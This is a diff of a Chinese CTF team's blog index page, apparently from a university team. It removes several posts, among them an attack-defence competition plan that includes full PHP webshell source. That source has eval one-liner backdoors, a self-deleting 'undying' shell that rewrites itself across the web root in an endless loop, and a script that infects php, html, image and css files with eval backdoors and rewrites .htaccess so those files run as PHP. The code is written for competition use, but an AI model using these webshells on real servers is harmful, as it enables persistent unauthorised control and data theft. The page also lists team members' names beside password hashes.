@@ -101,6 +101,8 @@
 				        
 							<li><a href="/archives">所有文章</a></li>
 				        
+							<li><a href="/tags/%E9%9A%8F%E7%AC%94">随笔</a></li>
+				        
 						</ul>
 					</nav>
 					<nav class="header-nav">
@@ -156,6 +158,8 @@
 		        
 					<li><a href="/archives">所有文章</a></li>
 		        
+					<li><a href="/tags/%E9%9A%8F%E7%AC%94">随笔</a></li>
+		        
 		        <div class="clearfix"></div>
 				</ul>
 			</nav>
@@ -169,268 +173,11 @@
 </nav>
       <div class="body-wrap">
   
-    <article id="post-准备" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-CISCN" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2023/06/01/%E5%87%86%E5%A4%87/" class="article-date">
-  	<time datetime="2023-06-01T03:08:58.233Z" itemprop="datePublished">2023-06-01</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="加固阶段"><a href="#加固阶段" class="headerlink" title="加固阶段"></a>加固阶段</h3><ol>
-<li><p>给自己的靶机上马</p>
-<p>假定有3台web靶机（A,B,C）何骏博，刘磊，高旭东，一人一台给自己上马</p>
-</li>
-<li><p>上weblogger</p>
-<p>高旭东负责，密码：<code>b565769ffbfe776234873fa18cc8b8a2</code></p>
-</li>
-<li><p>上watchbird</p>
-<p>高旭东负责，密码：<code>b565769ffbfe776234873fa18cc8b8a2</code></p>
-</li>
-<li><p>下载源码</p>
-<p>何骏博和刘磊负责，下载完成后，D盾扫描+Easy分析，删除原始后门</p>
-</li>
-<li><p>准备批量后门利用</p>
-<p>何骏博和刘磊负责</p>
-</li>
-<li><p>删除自己靶机的预留后门</p>
-<p>何骏博和刘磊负责</p>
-</li>
-<li><p>PWN靶机交给殷连接负责</p>
-</li>
-<li><p>更改密码（SSH,后台）</p>
-<p>刘磊SSH :<code>8bf50a70d5922a1714175b09d5f99b48</code></p>
-<p>何骏博后台 : <code>b565769ffbfe776234873fa18cc8b8a2</code></p>
-</li>
-<li><p>扫秒其他队伍端口</p>
-<p>高旭东负责，要产生<code>ip.txt</code></p>
-</li>
-<li><p>上文件监控</p>
-</li>
-</ol>
-<h3 id="脚本类型"><a href="#脚本类型" class="headerlink" title="脚本类型"></a>脚本类型</h3><h4 id="原始后门利用"><a href="#原始后门利用" class="headerlink" title="原始后门利用"></a>原始后门利用</h4><h5 id="GET传参eval"><a href="#GET传参eval" class="headerlink" title="GET传参eval"></a>GET传参eval</h5><h6 id="产生小马"><a href="#产生小马" class="headerlink" title="产生小马"></a>产生小马</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="POST传参eval"><a href="#POST传参eval" class="headerlink" title="POST传参eval"></a>POST传参eval</h5><h6 id="产生小马-1"><a href="#产生小马-1" class="headerlink" title="产生小马"></a>产生小马</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><h6 id="删除原始后门"><a href="#删除原始后门" class="headerlink" title="删除原始后门"></a>删除原始后门</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h6 id="产生大马"><a href="#产生大马" class="headerlink" title="产生大马"></a>产生大马</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h6 id="不死性检测"><a href="#不死性检测" class="headerlink" title="不死性检测"></a>不死性检测</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="批量利用"><a href="#批量利用" class="headerlink" title="批量利用"></a>批量利用</h4><h6 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h6 id="后台修改密码"><a href="#后台修改密码" class="headerlink" title="后台修改密码"></a>后台修改密码</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h6 id="后台上马"><a href="#后台上马" class="headerlink" title="后台上马"></a>后台上马</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h6 id="读取flag（漏洞）"><a href="#读取flag（漏洞）" class="headerlink" title="读取flag（漏洞）"></a>读取flag（漏洞）</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h6 id="读取flag（木马）"><a href="#读取flag（木马）" class="headerlink" title="读取flag（木马）"></a>读取flag（木马）</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>批量交flag</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="木马使用规则"><a href="#木马使用规则" class="headerlink" title="木马使用规则"></a>木马使用规则</h3><h4 id="本机木马"><a href="#本机木马" class="headerlink" title="本机木马"></a>本机木马</h4><p>上传到本机的木马<code>makewustgreatagain.php</code>，密码规范为：<code>wustwust.%</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>])===<span class="string">&#x27;c370f2b78875373aa92ebe5a18e72697&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="敌机小马"><a href="#敌机小马" class="headerlink" title="敌机小马"></a>敌机小马</h4><p>上传到敌机的小马<code>wust.php</code>，密码规范为：<code>wustvelvetyyds</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>])===<span class="string">&#x27;66c39f3b833676fea27da256d15dcd09&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="敌机不死马"><a href="#敌机不死马" class="headerlink" title="敌机不死马"></a>敌机不死马</h4><p>上传到敌机的不死马母本，两种类型</p>
-<table>
-<thead>
-<tr>
-<th>命名规范</th>
-<th>说明</th>
-<th>密码规范</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>velvet.php</code></td>
-<td>在所有目录下产生<code>velvet.php</code>不死马</td>
-<td><code>velvetboom...</code></td>
-</tr>
-<tr>
-<td><code>wustvelvet.php</code></td>
-<td>在所有目录的所有文件结尾追加一句话木马</td>
-<td><code>wust!!!boom!!!</code></td>
-</tr>
-</tbody></table>
-<p><code>velvet.php</code>母本源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line"> <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"> <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"> <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> <span class="variable">$file</span> = <span class="string">&#x27;velvet.php&#x27;</span>;</span><br><span class="line"> <span class="variable">$code</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;PD9waHAgIGlmKG1kNSgkX0dFVFsncGFzcyddKT09PSc4OTY3MjgzM2YxZDlhZDgyNzVjYjAxZTc2NmVlNzQwMycpICBAZXZhbCgkX1BPU1RbJ2NtZCddKTsgID8+&#x27;</span>);</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">bl_scandir</span>(<span class="params"><span class="variable">$dirname</span>,<span class="variable">$filename</span>,<span class="variable">$shellcode</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$filepath</span> = <span class="variable">$dirname</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$filename</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$filepath</span>)&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filepath</span>))!==<span class="title function_ invoke__">md5</span>(<span class="variable">$shellcode</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filepath</span>, <span class="variable">$shellcode</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filepath</span>, <span class="variable">$shellcode</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_ invoke__">system</span>(<span class="string">&quot;chmod 777 <span class="subst">$filepath</span>&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">touch</span>(<span class="variable">$filepath</span>,<span class="title function_ invoke__">mktime</span>(<span class="number">20</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">28</span>,<span class="number">2021</span>));</span><br><span class="line">  <span class="variable">$dirArr</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$dirname</span>);</span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$dirArr</span> <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$v</span> != <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$v</span> != <span class="string">&#x27;..&#x27;</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dirname</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$v</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">bl_scandir</span>(<span class="variable">$dirname</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$v</span>,<span class="variable">$filename</span>,<span class="variable">$shellcode</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">  <span class="title function_ invoke__">bl_scandir</span>(<span class="variable">$_SERVER</span> [<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>],<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">  <span class="title function_ invoke__">usleep</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><code>velvet.php</code>子本源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>])===<span class="string">&#x27;89672833f1d9ad8275cb01e766ee7403&#x27;</span>)  @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><code>wustvelvet.php</code>母本源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Author:lanb0</span></span><br><span class="line"><span class="comment">AWD专用，切勿非法使用</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//指定你要感染的文件类型后缀</span></span><br><span class="line"><span class="variable">$extensions_array</span>=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>,<span class="string">&#x27;so&#x27;</span>,<span class="string">&#x27;ico&#x27;</span>,<span class="string">&#x27;css&#x27;</span>,<span class="string">&#x27;tpl&#x27;</span>,<span class="string">&#x27;.db&#x27;</span>);</span><br><span class="line"><span class="variable">$extensions</span>=<span class="string">&#x27;.&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27; .&#x27;</span>,<span class="variable">$extensions_array</span>);</span><br><span class="line"><span class="comment">//指定WEB根目录</span></span><br><span class="line"><span class="variable">$web_root</span>=<span class="variable">$_SERVER</span> [<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$virus_content</span>=<span class="string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;0147af54d09fb043736514cdfb68c511&quot;)&#123;@eval($_POST[\&#x27;cmd\&#x27;]);&#125; //HACK_FLAG ?&gt;&#x27;</span>;<span class="comment">//一句话木马的内容</span></span><br><span class="line"><span class="variable">$htaccess_content</span>=<span class="string">&#x27;&lt;IfModule mod_mime.c&gt;&#x27;</span>.PHP_EOL.</span><br><span class="line"><span class="string">&#x27;AddType application/x-httpd-php &#x27;</span>.<span class="variable">$extensions</span>.PHP_EOL.</span><br><span class="line"><span class="string">&#x27;&lt;/IfModule&gt;&#x27;</span>;<span class="comment">//添加的配置文件的内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//当然，如果www-data的权限肯定有些还是无法写马的,请根据具体情况使用</span></span><br><span class="line"><span class="comment">//注意chdir，直接&#x27;/&#x27;是切换到系统根目录，但正常情况肯定没权限，所以建议用apche的根目录$_SERVER[&#x27;DOCUMENT_ROOT&#x27;，但注意，code加载到内存后这个变量就不存在了，所以还是得用绝对路径]</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_shell</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$htaccess_content</span>,<span class="variable">$virus_content</span>,<span class="variable">$extensions_array</span>,<span class="variable">$web_root</span>;</span><br><span class="line">    <span class="variable">$files</span>=<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">    <span class="comment">//改权限,不然没法写马</span></span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;chmod 777 ./* .*&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$files</span>)==<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="comment">//空目录，退出</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="comment">//跳过..和.还有weblogger，这个是测试用的</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$file</span>==<span class="string">&#x27;.&#x27;</span>||<span class="variable">$file</span>==<span class="string">&#x27;..&#x27;</span>||<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-f0-9]&#123;32&#125;$/i&#x27;</span>, <span class="variable">$file</span>)||<span class="variable">$file</span>==<span class="string">&#x27;weblogger&#x27;</span>||<span class="variable">$file</span>==<span class="string">&quot;wust.php&quot;</span>||<span class="variable">$file</span>==<span class="string">&quot;velvet.php&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//是目录就递归</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_dir</span>(<span class="variable">$file</span>)&amp;&amp;<span class="variable">$file</span>!==<span class="string">&quot;.&quot;</span>&amp;&amp;<span class="variable">$file</span>!==<span class="string">&quot;..&quot;</span>)&#123;</span><br><span class="line">           </span><br><span class="line">            <span class="title function_ invoke__">chdir</span>(<span class="variable">$file</span>);</span><br><span class="line">            </span><br><span class="line">           </span><br><span class="line">            <span class="title function_ invoke__">add_shell</span>();</span><br><span class="line">            <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;../&#x27;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//上传.htaccess来使其他文件也可以被php解析</span></span><br><span class="line">       </span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;.htaccess&#x27;</span>,<span class="variable">$htaccess_content</span>);</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_hacked</span>(<span class="variable">$file</span>)&amp;&amp;<span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$file</span>,<span class="string">&#x27;.&#x27;</span>),<span class="number">1</span>),<span class="variable">$extensions_array</span>))&#123;</span><br><span class="line">    </span><br><span class="line">            <span class="comment">//开始加马,注意权限</span></span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$virus_content</span>, FILE_APPEND); <span class="comment">// 向文件追加一句话</span></span><br><span class="line">            </span><br><span class="line">            <span class="title function_ invoke__">usleep</span>(<span class="number">500000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">500000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//感染当前目录下的所有文件</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">add_shell</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$web_root</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;error 5\n&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;../../../../../../../&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//通过读取标志来判断是否已经写过马，避免重复写马</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_hacked</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filesize</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable">$start_position</span> = <span class="title function_ invoke__">max</span>(<span class="number">0</span>, <span class="variable">$filesize</span> - <span class="number">35</span>);</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fseek</span>(<span class="variable">$file</span>, <span class="variable">$start_position</span>);</span><br><span class="line">    <span class="variable">$last_chars</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">35</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;error 6\n&#x27;</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$last_chars</span>,<span class="string">&#x27;HACK_FLAG&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-周报" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/06/01/%E5%91%A8%E6%8A%A5/" class="article-date">
-  	<time datetime="2023-06-01T03:08:58.232Z" itemprop="datePublished">2023-06-01</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="周报"><a href="#周报" class="headerlink" title="周报"></a>周报</h1><h2 id="本周工作内容"><a href="#本周工作内容" class="headerlink" title="本周工作内容"></a>本周工作内容</h2><ul>
-<li>在这里列出本周完成的主要工作内容，包括项目名称、任务描述、进度情况、遇到的问题和解决方案等。</li>
-</ul>
-<h2 id="下周工作计划"><a href="#下周工作计划" class="headerlink" title="下周工作计划"></a>下周工作计划</h2><ul>
-<li>在这里列出下周计划进行的主要工作内容，包括项目名称、任务描述、预期目标、时间安排等。</li>
-<li>可以使用无序列表或有序列表的格式，根据工作内容的优先级和依赖关系进行排序和分组。</li>
-<li>如果有相关的需求分析、设计方案、技术选型等，可以使用链接或图片的方式附在相应的内容后面。</li>
-</ul>
-<h2 id="本周知识点总结"><a href="#本周知识点总结" class="headerlink" title="本周知识点总结"></a>本周知识点总结</h2><ul>
-<li>周报的重点，参考的学习文章必要时给出链接</li>
-</ul>
-<h2 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h2><ul>
-<li>非必须，可不写</li>
-</ul>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-指南" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/06/01/%E6%8C%87%E5%8D%97/" class="article-date">
-  	<time datetime="2023-06-01T03:08:58.230Z" itemprop="datePublished">2023-06-01</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="web学习"><a href="#web学习" class="headerlink" title="web学习"></a>web学习</h1><ol>
-<li><p>先学php语言</p>
-<p>不一定到多么精通，起码要会基础语法，随便给一段代码能分析出在干什么就行了</p>
-</li>
-<li><p>学一下简单的sql语句</p>
-<p>大概了解基础</p>
-</li>
-</ol>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-隐写" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/06/01/%E9%9A%90%E5%86%99/" class="article-date">
-  	<time datetime="2023-06-01T03:08:58.229Z" itemprop="datePublished">2023-06-01</time>
+      <a href="/2023/06/01/CISCN/" class="article-date">
+  	<time datetime="2023-06-01T03:08:58.210Z" itemprop="datePublished">2023-06-01</time>
 </a>
     </div>
   
@@ -443,8 +190,8 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2023/06/01/%E9%9A%90%E5%86%99/">
-        隐写
+      <a class="article-title" href="/2023/06/01/CISCN/">
+        CISCN
         
       </a>
     </h1>
@@ -455,86 +202,26 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h1><h2 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h2><h3 id="png"><a href="#png" class="headerlink" title="png"></a>png</h3><h4 id="认识png文件格式"><a href="#认识png文件格式" class="headerlink" title="认识png文件格式"></a>认识png文件格式</h4><p>标志位+IHDR+（n）IDAT+IEND</p>
-<h4 id="改宽高-crc校验"><a href="#改宽高-crc校验" class="headerlink" title="改宽高(crc校验)"></a>改宽高(crc校验)</h4><h4 id="pngcheck"><a href="#pngcheck" class="headerlink" title="pngcheck"></a>pngcheck</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt insatll pngcheck</span><br></pre></td></tr></table></figure>
